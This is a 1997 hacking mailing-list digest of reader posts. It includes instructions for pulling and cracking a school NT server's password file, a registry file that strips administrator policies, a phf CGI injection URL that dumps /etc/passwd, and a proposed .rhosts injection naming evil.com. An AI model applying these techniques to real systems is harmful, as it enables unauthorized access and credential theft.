@@ -1,0 +1,838 @@
+Happy Hacker Digest March 13-14, 1997 
+====================================================================== 
+      This is a moderated list for discussions of *legal* hacking. 
+           Moderators: Carolyn Meinel and Ruben D. Canlas Jr.
+                 
+            OR to the Hackers forum: http://www.infowar.com 
+Digest archives are held under the "New" button at the Infowar site
+
+               Please don't send us anything you wouldn't 
+              email to your friendly neighborhood narc, OK?
+
+        To subscribe or unsubscribe, 
+  use the subscribe boxes on the menu bars, please.. If you decide 
+you just want to use the forum and not get these mailings, we promise 
+       our feelings won't get hurt if you unsubscribe from this list. 
+                       H a p p y  h a c k i n g ! 
+================================================================= 
+URL 'O the Day: http://ds2.internic.net/rfc/rfc1700.txt. Read it and you'll 
+be in for some happy port surfing! 
+=================================================================
+
+[TABLE OF CONTENTS] 
+   o Notes from the Moderator 
+   o Another Internet Explorer Bugs Finally Makes News 
+   o Windows 95 and NT Hacking 
+   o Canadian Law 
+   o How to Catch Email Bombers 
+   o More Cracking Techniques 
+   o Shell Account Question 
+   o How to find IP Addresses 
+   o Port Surfing 
+   o Looking for Halifax, Nova Scotia hackers 
+   o Fighting ICMP Attacks 
+   o Rants, er, Calm, Reasoned Discourse
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- 
+NOTES FROM THE MODERATOR: 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- 
+The Infowar IRC channel was shut down temporarily due to hacker wars. But 
+we'll be up again with the help of several volunteers from this list who 
+will serve as IRC cops. We'll announce their names/handles shortly. We also 
+are negotiating with the ISP that provides the server for our Infowar forum 
+to more RAM so the forum will respond faster. In the meantime, however, 
+please remember that we can get your posts up faster at the forum. And your 
+work will be posted where over 50,000 people per week can see it, as 
+compared to the only 2,300 readers of this list.
+
+Help, we could still use more volunteers for moderators! We will soon launch 
+the intermediate hacker list, but the volume of really great posts suitable 
+for the beginner list is still likely to continue to be high. Our apologies 
+to those of you who have sent us great material that we haven't published yet.
+
+Perhaps the best solution may be to split the beginner list into several 
+topics, for example Linux, Windows hacking, IRC? If there are any volunteers 
+out there, please contact us!
+
+=================================================== 
+Another Internet Explorer Bugs Finally Makes News 
+=================================================== 
+According to a recent Associated press report written by Tim Klass, 
+"Double-clicking on icons to run programs as in normal Windows operations, 
+the defect would allow the operator to run programs secretly on another 
+computer, send electronic mail under someone else's name, severely damage 
+software stored on a hard drive or wipe out the hard drive altogether."
+
+Moderator: Remember folks, you first saw this bug on the Happy Hacker 
+Digest, Feb. 6, 1997, as reported by N-Treeg (n-treeg@ix.netcom.com). Kudos 
+to N-Treeg ! Hey, all you journalists on this list, why didn't any of you 
+report this earlier?
+
+====================================================== 
+Windows 95 and NT Hacking 
+======================================================
+
+From: streetrod@etsc.net (Joel Sexton)
+
+>The person who runs the library at my school is an evil witch 
+>who likes to spoil fun. When me and my friend got busted for 
+>using the network for a game of Quake she said that us "hackers" 
+>would never be let back in, ever again!
+
+Ah, I Know How "Library Witches" Can Be!
+
+>Time passed and we where not even allowed even near the library 
+>entrance. But now that the windows NT network is up she said that if 
+>we could hack her network and show her how we did it that she would 
+>let us back in.  Us, being labeled as the elite of the school took it 
+>as a welcome challenge.  BUT here is where the trouble starts. She has 
+>the disk WRITE PROTECTED. And since debug wont work properly with the 
+>permissions set like they are we cant do anything with that either. 
+>We tried for hours.. we even tried pinging down the server at no 
+>avail.  WE NEED YOUR HELP.. give us any ideas you have please!!!
+
+OK, the m$ dragon rears it's reeking' head again (but it is soon to be cut!) 
+OK, this Librarian (insert not so very nice word) thinks she's got you, ehh? 
+She better think Again!  OK, there's this handy little utility I found on my 
+Internet explorations... 
+It's called ntfsdos, if you know a lot about NT, you should be able to 
+figure out what It does from the name.  But I will assume that you don't. 
+Ntfs is the winnt replacement For the DOS fats (file allocation tables). 
+Ntfs is only readable by NT, so making a DOS Bootdisk and trying your luck, 
+is no good.  This little utility acts as an interpreter For your DOS 
+programs and allows you to boot from a DOS disk and read ntfs partitions And 
+barabing-baraboom, NT is at your feet.  You can use any DOS program to read 
+the NT HD, you can copy files from the NT HD.  It may be write-protected, 
+but it isn't Read-protected!  So, this is what you do, Go to 
+http://www.ntinternals.com/ntfsdos.htm read the crap, download ntfsdos.zip 
+(it's at the very bottom of the page). Now create a system disk of DOS (not 
+win95 as it is harder to mess with using ntfsdos).  Unzip ntfsdos to the 
+system disk.  Create an Autoexec.bat file that will run ntfsdos upon boot 
+up, then copy the password file to your disk, or view em, or whatever!  I'm 
+not really sure how NT passwords work, but once You have control of the 
+system, you can get the files, then find some sort of utility to Crack em, 
+if they are encrypted.  Then you have the admin password!  The admin Won't 
+be able to do anything, but not let access to the file server to keep it 
+from Happening!  Oh yeah, you will have to do this from the file server, if 
+I didn't say so before!  Hope that helps, hope you learned! Thanx!
+
+~~YeddisH MonoxidE~~
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Sender: karpet@goodnet.com
+
+Dear Carolyn, 
+Got a ? for you about win95.  As you know, not all shareware programs come 
+with uninstall icons, and they often don't show up in the add/remove div of 
+control panel.  I have noticed, newbie that I am, that a trace or record of 
+some kind is being left behind when I delete these shareware programs 
+manually.  For example, if I have 25 days left in my trial run when I 
+delete, and several weeks later I download/install the same program again, 
+the nag screen on the new program tells me I now have 24 days left in my 
+trial run.
+
+My ? is, where are these traces left behind,(in the registry?) and how can I 
+get at/erase them?
+
+Moderator: The book _Secrets of Windows 95_ has an entire chapter on how to 
+read and edit the Win95 Registry. Evil Genius tip: if you learn how to edit 
+the Windows Registry, you have TOTAL control over the system.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Please Post Anonymous.
+
+I am a Network tech and recently the VP of IS comes to me and 
+says that he wants to know what is on a certain workstation's 
+hard disk.
+
+Here's the Setup: 
+The workstation is 45 miles from my location.  It is a DOS/Windows 
+Netware client running IPX only.  He logs onto a Netware server at 
+his location which is connected to my main ring.  So I have access to 
+his server even his machine via IPX.
+
+How can I get a directory listing?  Is there an NLM out there that I 
+can run on his server that would allow me to view his hard disk 
+contents?
+
+We have thought of Pcanywhere and net remote, but are not feasible 
+solutions.  We even thought of backing up his hard disk with 
+Upstreams Ultra.  But that may not work either.
+
+Thanks and kudos the Carolyn! Great list I read it religiously.
+
+TeKn0LuSt
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+From: k1neTiK <samk5@IDT.NET>
+
+Below is cut/paste of a .REG file that will turn off a large majority (at 
+least the important ones) of the policies can be invoked on a workstation 
+running Windows95.  I wanted to send this out so all those people who are at 
+work, and have had their administrator invoke policies on them they don't 
+want. It took me a while to find all this stuff in the registry, but here it 
+is(but first a few notes)
+
+1 - You will want to cut/paste the following into a file called 
+    "filename.REG" 
+2 - Double click that file, and it will import that information 
+    into the registry. 
+3 - You will then be free from those pesky little policies. 
+4 - Keep in mind though that the next time you logout/logon 
+    the Administrator may push those policies back down to your 
+    workstation and you may have to turn them off again.
+
+---Cut---
+
+REGEDIT4
+
+[HKEY_LOCAL_MACHINE\Network\Logon]
+
+[HKEY_LOCAL_MACHINE\Network\Logon] 
+"MustBeValidated"=dword:00000000 
+"username"="ByteMe" 
+"UserProfiles"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies] 
+"DisablePwdCaching"=dword:00000000 
+"HideSharePwds"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+
+"NoDrives"=dword:00000000 
+"NoClose"=dword:00000000 
+"NoDesktop"=dword:00000000 
+"NoFind"=dword:00000000 
+"NoNetHood"=dword:00000000 
+"NoRun"=dword:00000000 
+"NoSaveSettings"=dword:00000000 
+"NoRun"=dword:00000000 
+"NoSaveSettings"=dword:00000000 
+"NoSetFolders"=dword:00000000 
+"NoSetTaskbar"=dword:00000000 
+"NoAddPrinter"=dword:00000000 
+"NoDeletePrinter"=dword:00000000 
+"NoPrinterTabs"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network]
+
+"NoNetSetup"=dword:00000000 
+"NoNetSetupIDPage"=dword:00000000 
+"NoNetSetupSecurityPage"=dword:00000000 
+"NoEntireNetwork"=dword:00000000 
+"NoFileSharingControl"=dword:00000000 
+"NoPrintSharingControl"=dword:00000000 
+"NoWorkgroupContents"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+
+"NoAdminPage"=dword:00000000 
+"NoConfigPage"=dword:00000000 
+"NoDevMgrPage"=dword:00000000 
+"NoDispAppearancePage"=dword:00000000 
+"NoDispBackgroundPage"=dword:00000000 
+"NoDispCPL"=dword:00000000 
+"NoDispScrSavPage"=dword:00000000 
+"NoDispSettingsPage"=dword:00000000 
+"NoFileSysPage"=dword:00000000 
+"NoProfilePage"=dword:00000000 
+"NoPwdPage"=dword:00000000 
+"NoSecCPL"=dword:00000000 
+"NoVirtMemPage"=dword:00000000 
+"DisableRegistryTools"=dword:00000000
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp
+
+                             [END of message text] 
+                          [Already at end of message] 
+  PINE 3.91   MESSAGE TEXT           Folder: INBOX  Message 178 of 433 END 
+ 
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp 
+] 
+"Disabled"=dword:00000000 
+"NoRealMode"=dword:00000000
+
+==================================== 
+Canadian Law 
+====================================
+
+From: Vithar <vithar@connect.ab.ca>
+
+> 1) All the laws that you refer to are of course American, but what about 
+> Canadian law? Would you happen to know what there is on the books re:
+
+  I don't know about extradition etc. but here's the relevant material 
+that I could find in the Criminal Code of Canada ( Sorry, it's a bit long 
+):
+
+342.1(1) Unauthorized use of computer
+
+342.1 (1) Every one who, fraudulently and without colour of right, 
+  
+(a) obtains, directly or indirectly, any computer service,
+
+(b) by means of an electro-magnetic, acoustic, mechanical or other 
+device, intercepts or causes to be intercepted, directly or 
+indirectly, any function of a computer system, or
+
+(c) uses or causes to be used, directly or indirectly, a computer 
+system with intent to commit an offence under paragraph (a) or (b) or 
+an offence under section 430 in relation to data or a computer system
+
+is guilty of an indictable offence and liable to imprisonment for a 
+term not exceeding ten years, or is guilty of an offence punishable on 
+summary conviction. 
+ 
+
+430(1.1) Mischief in relation to data
+
+(1.1) Every one commits mischief who willfully
+
+(a) destroys or alters data;
+
+(b) renders data meaningless, useless or ineffective;
+
+(c) obstructs, interrupts or interferes with the lawful use of data; 
+or
+
+(d) obstructs, interrupts or interferes with any person in the lawful 
+use of data or denies access to data to any person who is entitled to 
+access thereto.
+
+430(2) Punishment
+
+(2) Every one who commits mischief that causes actual danger to life 
+is guilty of an indictable offence and liable to imprisonment for 
+life.
+
+430(5) Idem
+
+(5) Every one who commits mischief in relation to data
+
+(a) is guilty of an indictable offence and liable to imprisonment for 
+a term not exceeding ten years; or
+
+(b) is guilty of an offence punishable on summary conviction.
+
+/-----  /\oo/\ Debian ! /\oo/\ ----------------------------------------\ 
+|                                      |  The more clocks you have ... | 
+| vithar@connect.ab.ca                 |  .....  the less sure you are | 
+| http://www.connect.ab.ca/~vithar     |  of what time it is !         | 
+\----------------------------------------------------------------------/
+
+========================================= 
+How to Catch Email Bombers 
+=========================================
+
+From: bbuster@succeed.net (Bronc Buster)
+
+>I have and idea of how to stop mail bombs.  sendmail could be modified so 
+>that it scans all messages for signs of Mail-Bomb script.  If it does find 
+>it, then it sends it to the sender, not the receiver.  That would put an 
+>immediate end to all of the problems, and teach the stupid kids not to use 
+>mail bomb programs! 
+>_______________________________________ 
+> 
+>                            Ryan Barrett; 
+>                       RadBite@aol.com;
+
+ I had to reply to this..... For all of you who don't know, there is no 
+"mail-bomb" script to detect, or any tell tail mark that says "this is an 
+e-mail bomb".  For anyone who might of missed it, I posted to the list a few 
+weeks ago on how to look at a header and see where an e-mail bomb came from. 
+SMTP is SIMPLE mail transfer protocol, see the first word?
+
+ My filter that is set up on my BSD system simply checks for the number of 
+e-mails from a domain in a certain about of time. If that time limit is 
+broken, from then on they are just rejected. This is a simple filter you can 
+get on the net, but as Rouge Agent pointed out, people are to apt to ASK/BEG 
+for information, rather than try to find it themselves. I did a net search 
+for one on Excite and got 1895 hits without being to exact... 
+  
+ 
+
+Regards                   \__ ^^ __/ 
+   BB                        X  X 
+                             \  / 
+                              \/
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Sender: jericho@dimensional.com
+
+>    The difference between the Internet Explorer bug and email bombing 
+>    programs is that there is a simple fix that will solve the Internet 
+>    Explorer bug. But in the case of email bombing, the fixes are 
+>    partial and all have serious disadvantages. There are those in the
+
+No, not all solutions have serious disadvantages. Many people have thought 
+of a workable solution that would take very little effort in the long run.
+
+1) server level authentication 
+2) an "external" sendmail configuration file. This file would basically 
+act as an 'allow' file, listing which sites could do anything more 
+than deliver mail. If you don't come from a 'trusted' site (listed 
+explicitly in that file), then you can only drop new mail.
+
+This kind of coding would not be difficult at all.
+
+>    computer security industry -- for example Winn Schwartau (and 
+>    myself)-- who regard email bombing as the single most pressing 
+>    problem for the Internet today. I'm afraid email bombing will
+
+How can you say it is that big of a problem when you also talk about how 
+easy it is to counter? It is pretty difficult to counter a SYN flood 
+unless you upgrade to a new kernel (which is not always fun). Since it is so 
+much harder to counter, that should be a little more pressing of a 
+problem. Or how about IP Frag attacks? Seems to me those will be a MUCH 
+bigger problem than any mail bomb could ever become.
+
+>    continue to be a growing lamer fest (as you so succinctly put it) 
+>    until we work a better technical solution. But the Internet 
+>    Explorer bug will soon be history.
+
+Only to be replaced by another...
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+From: GR8GUY <cyoung@northernnet.com>
+
+I would like to say that email bombing is very lame and most of the people 
+who make those programs realize the risk of using them and don't use the 
+program themselves.  Besides that the people who make those know how to do 
+REAL hacks and don't email bomb!! however what some hackers need to do is 
+get some ethics and stop putting email bomb crap all over there page! Yes, 
+email bombing is kewl but when the IP in the headers is tracked down then 
+don't a DNS search on it...then email the IP and date that you received the 
+email bomb to the admin of IP you searched the guy is busted...all the admin 
+has to do is check his log file and by the IP (Internet protocol) he will 
+know what user was doing the email bomb then take appropriate measures!! 
+time to stop spreading email bomb crap around the net everyone its fun to 
+learn, but lame to use!! and with identd growing very few servers are 
+anonymous!! time to move on b***** b*****... (Name foobared by moderator to 
+keep idiots from running to this email bomb site and launching a lamerfest) 
+  GR8GUY 
+(LITTE BOY) 
+                        ?~----------------------------------~? 
+                        #  http://www.northernnet.com/cyoung # 
+                        #                                    # 
+                        #   power flows out of the beauty    # 
+                        #          of the baud               # 
+                        ?~----------------------------------~? 
+  
+ 
+
+=========================================== 
+More Cracking Techniques 
+===========================================
+
+From: Anonymous FTP <ftp@ferberts.com>
+
+  phf bug 
+  astr0 
+  7 March 1997
+
+  This article is about using the cgi-script 'phf' to break into remote 
+  systems.
+
+  The phf cgi-script is supposed to provide a phone number lookup- 
+  service.  But specific queries can be sent to it to run arbitrary 
+  commands on the remote system.  For example: 
+  http://www.nowhere.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
+  displays the password file.  a different query like 
+  ?Qalias=x%0a/bin/uname%20-a shows what kind of system is running.  The 
+  phf bug can let you remotely examine the entire system to find bigger 
+  holes to exploit.  The 0a is '\' and the %20 is a space.  You can 
+  insert any special character into the query with these control codes.
+
+  The phf bug is widely known, so it is tough to find a server with this 
+  cgi-script installed.  Luckily, many servers advertise what is on 
+  their system through publicly available statistics pages.  To make 
+  things even easier, web spiders often index these statistics pages. 
+  On Altavista for example, a search of '+cgi +phf' will return a mother 
+  lode of phf vulnerable servers.
+
+  Using this method, I found a server with these two entries in the 
+  password file:
+
+       ftp::0:0:Anonymous FTP:/home/ftp:/bin/csh 
+       sunsync::0:0:Sun Sync:/usr/lib/sync:/bin/csh
+
+  Anyone in the world can log into this server without a password and 
+  get a root shell.  This server has been hacked already.  The phf bug 
+  has turned up more than a few passwd files, some of them shadowed, but 
+  most not.
+
+  The important thing is to make sure that the phf script is deleted 
+  from any machine that is running a web server.  Many older Unix 
+  distributions (the one above is from a system running SunOS) come 
+  preloaded with phf.  It is most commonly found in /home/httpd/cgi-bin/ 
+  in systems running Apache.  Delete it or run 'chmod 0 phf'.
+
+  Coming Soon... Installing and Finding Back Doors
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Please anonymize me.
+
+ I was actually kind of surprised when I got OD phreak's long command 
+(http://,,,.,,,.,,,/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd) from a 
+previous guide to work. If you haven't tried it yet, try it out now. 
+I got the password file, but it was shadowed. Can I edit this to 
+get the shadowed file or any other valuable files?
+
+One last thing: If you telnet to prez.cn.camriv.bc.ca, you can login as 
+lynx and get a free (legal) lynx browser account (it's just like logging 
+on as a guest). Are this means that any site you go to doesn't know who 
+you really are. What kind of things would this account be good for?
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+From: Warpy <root@null.net>
+
+I was wondering about the following. Is it possible for someone to remotely 
+create a .rhosts file in a users directory in a remote server. The command 
+appended to /cgi-bin/ would look something like the following...
+
+http://targethost.com/cgi-bin/finger?user; \echo root@evil.com > 
+/usr/user/.rhosts
+
+Is this possible? If not are there any other ways remote users could 
+exploit a vulnerable cgi server to allow remote access?
+
+Warpy 
+ 
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Sender: NiNo@main.rgv.net
+
+I would like to know, what other methods besides finding the passwd file 
+and or shadow  file there are in getting into an ISP.  For knowledge's sake 
+of course.  If you finally do get the passwd file and it has *'s then you 
+got to find the shadow, if you do and it is ROOT readable only, then what? 
+Does that mean your out of luck?  Flame on....
+
+ThE neWbIe HaCkErS LoVe To HaTe, 
+NiNo
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+ [--NiNo@RgV.NeT   * SkAnkIn' yO' WaY soOn*--] 
+            ***I RuLe So  yOu DoNt HaVe To *** 
+                ** http://www.rgv.net/~nino ** 
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 
+  
+ 
+
+=========================================== 
+Shell Account Question 
+===========================================
+
+From: Engineering Practice Pty Ltd <cdep@jimi.vianet.net.au>
+
+I was just wondering can you download stuff from your shell account to 
+your home  pc(i.e. mail )?  I looked at the help files but couldn't find 
+anything that would help 
+ thanks
+
+Moderator: Use a file transfer protocol (FTP) program. There are many really 
+good ones free for the download on the Web, and one is included in the Win 
+95 operating system. On some systems kermit downloads will work, too.
+
+========================================== 
+British Hacker Note (from a Swedish hacker) 
+==========================================
+
+From: Iggy Drougge <optimus@canit.se> 
+British hackers out there should read alt.ph.uk, be sure to pick the FAQ up 
+too.
+
+=========================================== 
+How to find IP Addresses 
+===========================================
+
+Sender: wolak@wolak.com
+
+There is a clever way to find someone's IP address. It uses a Java 
+(great language) applet. The applet is allowed to look at only a few 
+things about a host machine, and one of them is the host's IP. Also, 
+applets are allowed to open up sockets to the server they came from. 
+So, it's possible to write one that reads the host_IP and sends it back 
+to a program on the server that records it. The same could be done with 
+an application on his computed that does the same thing. 
+  Hope this helps. 
+ Etaon Rish
+
+(It's a very easy couple of programs. take only a couple of minutes to 
+write. If you are too lazy, e-mail me and I'll send you the code. If you 
+don't know Java, I _HIGHLY_ recommend it.)
+
+=========================================== 
+Port Surfing 
+===========================================
+
+From: ae630@freenet.unbc.edu (Tim Gutteridge)
+
+ I have been port surfing and have found some unusual ports:
+
+1. On some machines, you get something called SSH on port 22. It allows 
+   you to enter one command and then boots you off. Man, help, and ? 
+   don't do anything.
+
+2. I forget what port it was on, but I found daemons (I hope I used that 
+   word right) called Rwrited and RWP. It was like some kind of weird 
+   Sendmail.
+
+I have 2 questions:
+
+1. What are these programs?
+
+2. What can I do to find the function of a port that I can access but 
+   can't seem to make do anything? 
+ 
+
+-- 
+_____    _____ 
+  |      |   __ 
+  |IM    |____|UTTERIDGE ae630@freenet.unbc.edu 
+ 
+
+Carolyn: SSH is Secure Shell, and is a program that Jericho thinks will keep 
+me out of his computer.  To learn just about everything about SSH, see 
+http://www.cs.hut.fi/ssh.
+
+To find the functions of ports that you can't get to do anything, one way is 
+to use your shell account.
+
+First, change to the /etc/ directory:
+
+->cd /etc
+
+Then command it to print it out to your screen with:
+
+ ->more services
+
+Or surf over to the RFC (request for comments) that covers all commonly used 
+port assignments. You can find a copy of this RFC at 
+http://ds2.internic.net/rfc/rfc1700.txt. Read it and you'll be in for some 
+happy port surfing!
+
+=========================================== 
+Looking for Halifax, Nova Scotia hackers 
+===========================================
+
+Sender: uberkool@istar.ca
+
+hey, I'm looking 4 other computer literates;) in the Halifax, Nova 
+Scotia area. looking 4 the experienced, but talented, devoted newbies 
+may be considered. just want to start a small group of @4-5 with like 
+minded;) others to share info;) experiment=;)learn;) and hang out with. 
+send your replies to: uberkool@istar.ca and call the attn to: the 
+siliconCoWbOy, with a subject: group5 later. 
+ps- don't waste my time with AOLame. 
+thank u. 
+tSC 
+;) 
+pss-no hackerz.
+
+******************************************* 
+*** What's that Mame? Why, I'm a CoWbOy.*** 
+******************************************* 
+ 
+
+======================================== 
+Fighting ICMP Attacks 
+========================================
+
+Is there anyway to block an ICMP or similar denial of service attack? 
+Someone told me one could firewall the offending IP...if so, how?
+
+Thanks 
+~grit9k
+
+Moderator: Get your ISP to block the offender at the router, just reject all 
+packets from that IP address. But then there is IP spoofing, which can 
+subvert a block at the router level..
+
+=========================================== 
+Rants, er, Calm, Reasoned Discourse 
+===========================================
+
+From: me38@juno.com (Certian Ly Notme)
+
+>Moderator: 
+> 
+>   So then why doesn't jericho give me that notarized statement so he 
+>   can prove to everyone that I'm an idiot? 
+> 
+Why should he publicly expose his true identity to an idiot (a reporting 
+idiot at that!) just to prove that she can't break into his box?  That 
+doesn't follow any pattern of logic that I can think of.
+
+Anyway, if you were any (insert expletive here) good you could break into 
+his box without him even knowing about it.  And if you did break in, and he 
+did find a trace of you in there and he reported you to any authority 
+whatsoever I'll pay you $500.  CM you can't do it.  All you do is take what 
+other people say and write it down.  In terms of writing you are what you 
+try to do with computers:  You're an HACK.  It's people like you that don't 
+deserve to live.  Your life is pathetic.  You have no purpose.  You do no 
+good.  You take others knowledge and exploit it or pretend that it is your 
+own.  If I didn't think you'd have a friend do the actual hacking, I'd offer 
+you 10 grand to break into my box.  But I think your word is about as 
+honorable as a priest's or a politician's.
+
+--Incidentally, no one got the joke eh?
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+From: Nathan <nathanp@worldchat.com>
+
+If you happened to see my post to the list a while ago you may have read 
+that a hacker who I apparently upsetted on IRC one day hacked into a server 
+under MY name.  Well we got him!  Some friends and myself got his IP address 
+(after searching through MANY longs) and then emailed it to the server he 
+was in.  Turns out...HE WORKS FOR THEM!  Needless to say this man was caught 
+and fired.  I really didn't want him fired or anything and I rather 
+respected his intelligence (just now how he chose to use it).  I'm currently 
+trying to get the other guy who he got booted off his ISP to drop his 
+statement and get this guy off the hook.  Am I wrong to do this? 
+Am I wrong for not hating this guy?
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Sender: cybogurra@hotmail.com 
+Hello there Happy Hackers! 
+"WhAt?!?" 
+That was my first reaction when I read that people were complaining about 
+"getting 25k/day". That's nothing. If you're not up to reading, don't bother 
+to hack. Who am I to say so? Well I AM a newbie, just like most people on 
+this list. A newbie to hacking that is. I've been into computers for 8 years 
+now, coding asm n' c++ on atari, amiga, and for the last three years, the 
+pc, and yes, I've learned most about that stuff by my self, reading mostly 
+other peoples code and online docs in order to learn. But hacking is 
+different. It will get you in jail if you screw up, not just give you 
+"Syntax error". So, other than having the will to explore systems and being 
+smart, u should also be able to read straight through those boring unixbooks 
+and man pages. Read a *lot*. So, what I want to say is I wouldn't mind 
+getting 100k/day from the hhlist. (..and no...That is NOT an mailbombing 
+invitation ;) If u don't like to read. Don't. But don't drag the rest of us 
+with u into ignorance. It also struck me the other day, that all those '1337 
+d00dz is doing the right thing being such a******* on IRC. If every hacker 
+would be helpful, and feed newbies with exploits on silver plates, those 
+newbies wouldn't learn shit. Other than how to go to jail. If a newbie would 
+care to walk down to the city library on the other hand, and get a good book 
+on Unix or whatever, he/she will learn a lot more. Am I wrong? I don't think so.
+
+I also have a question. I've ran into a system that seems to bee really 
+old, and the sisal has to be a moron. It runs smail 3.something, 
+telnet, netstat, finger, pop2, well.....basically everything a hacker could 
+wish for. But I'm curios, when I telnet it says "Tunix login:". Huh? 
+Tunix? What the F*** that? What kind of computer does it run on? I'd be 
+happy if someone could just give me some info on that. Thanx for your 
+time, and I sure do hope this gets posted. Oh, and by the way, I think 
+censuring bad language is a threat to free speech.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Sender: jericho@dimensional.com
+
+>    Besides, we are getting way too many excellent posts. The trouble 
+>    is that many readers are complaining about getting 25 kb/day from 
+>    this list. Right now we are badly backlogged, too. Post to Infowar 
+>    and we'll get your post up within 36 hours, whereas you may wait 
+>    for 5 or 6 days on this list.
+
+The other problem is bandwidth. I am sitting on a T1 and will wait for 10 
+minutes for one page to load. The server that hosts that site needs a 
+little more RAM, and a little more bandwidth.
+
+=-=
+
+>    But the NeXt holes are old and unpatched, so oftentimes serious 
+>    crackers have all the tools they need to crack them already on 
+>    hand.
+
+So explain that -froot bug working on one recent kernel revision for 
+Linux. :) Many linux and sun bugs have gone unpatched.. and I would say 
+more than Next.
+
+=-=
+
+>    systems? I mean eventually any dialup no matter how routed can be 
+>    traced back to a base number somewhere and other than cell clones I 
+>    can't conceive other untraceable methods. Wouldn't detection be as 
+>    easy as asking telephone companies to show their logs or something?
+
+Remember, CID is not effective as a means of tracing. As for 
+"untraceable", there is no such thing. What should be considered is how 
+much effort will feds put into a trace? In the case of Mitnick, they went 
+above and beyond any normal investigation. I can also cite another good 
+example local to me where the FBI couldn't figure out how to trace through a 
+PBX. So, they kinda closed shop and left the ISP to fend for themselves.
+
+>    And isn't cell cloning expensive?  It's been a question I've been
+
+Not really. For quick and easy cloning, it takes nice cables which should be 
+store bough, but isn't required. Some cell phones (very few) can be done 
+through keypad, so it costs nothing beyond the cost of the phone.
+
+>    prime GALF targets. The modus operandi is to break into a computer, 
+>    send threatening and obscene messages to email addresses found on 
+>    the system, and then erase the system files. Breaking tactics 
+>    typically begin with sniffed passwords, followed by installing a 
+>    program that allows telnet into a root shell.
+
+To be fair, remember that GALF doesn't delete files from all systems. 
+There are several that are left virtually untouched after intrusion.
+
+=-=
+
+> Moderator: 
+> 
+>    So then why doesn't jericho give me that notarized statement so he 
+>    can prove to everyone that I'm an idiot?
+
+FOR THE LAST TIME CAROLYN, I DO NOT WANT TO GIVE UP THE INFO REQUIRED FOR 
+THAT. IT WOULD GIVE YOU MY FULL NAME, ADDRESS, AND POSSIBLY MORE INFO. I 
+have posted to this list half a dozen times saying you are welcome to do it. 
+I offered to post the same in any newsgroup or other mail list. I even 
+offered to digitally sign that letter. That is the best you will get.
+
+=-=
+
+>    So you're going to cut him in on some of the profits, right? Last I 
+>    checked, Netly News owed him 150 bucks for an article he wrote. He 
+>    told them to hold the tab for now. 
+> 
+> Moderator (aside): 
+> 
+>    (You know and I know that Angry Johnny email bombed me as a free 
+>     public disservice that just happened to backfire on him to my 
+>     advantage.  But, hey, if you think email bombers should be paid by 
+>     their targets, why not run an ad in Infoworld or 2600 offering to 
+>     email bomb anyone who will pay your for the 2 minutes it takes to 
+>     carry out the attack?)
+
+How can you say it backfired on him? He got his message across. That was 
+his only goal. Mission accomplished. Either way, if you are using him as a 
+writing source to tap into this 'gold mine', I think you should include him 
+in your profits. Just like we originally argued that if you use material 
+from this list that some of us post, you should cut us in on it too.
+
+Carolyn: I would be happy to email bomb you, jericho, if you and your ISP 
+will both give me a notarized statement authorizing me to bomb you, and 
+setting the terms of  payment for my act. Let's see, it takes about two 
+minutes to email bomb, I think I will charge you $4,000. Surely you are 
+smart enough to turn an email bombing into a goldmine.
+
+As for me or any of the other journalists on this list using your material, 
+rest assured that the Bern copyright convention protects your writing. 
+However, there is no copyright on ideas. 
+Carolyn Meinel 
+M/B Research -- The Technology Brokers
